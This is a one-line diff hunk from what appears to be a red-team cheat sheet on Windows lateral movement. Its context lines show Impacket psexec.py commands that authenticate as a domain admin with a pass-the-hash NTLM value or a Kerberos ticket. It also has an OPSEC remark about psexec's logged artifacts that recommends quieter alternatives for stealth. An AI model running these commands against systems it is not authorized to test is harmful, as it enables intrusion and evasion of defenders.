@@ -35,7 +35,7 @@ psexec.py -hashes :NTLM_HASH domain/admin@target
 psexec.py -k -no-pass domain/admin@target
 ```
 
-**OPSEC**: Creates a service (PSEXESVC), writes to ADMIN$ share, generates Event ID 7045. Noisy — use alternatives when stealth matters.
+**OPSEC**: Creates a service (PSEXESVC), writes to ADMIN$ share, generates Event ID 7045. Noisy - use alternatives when stealth matters.
 
 ## WMI (T1047)
 
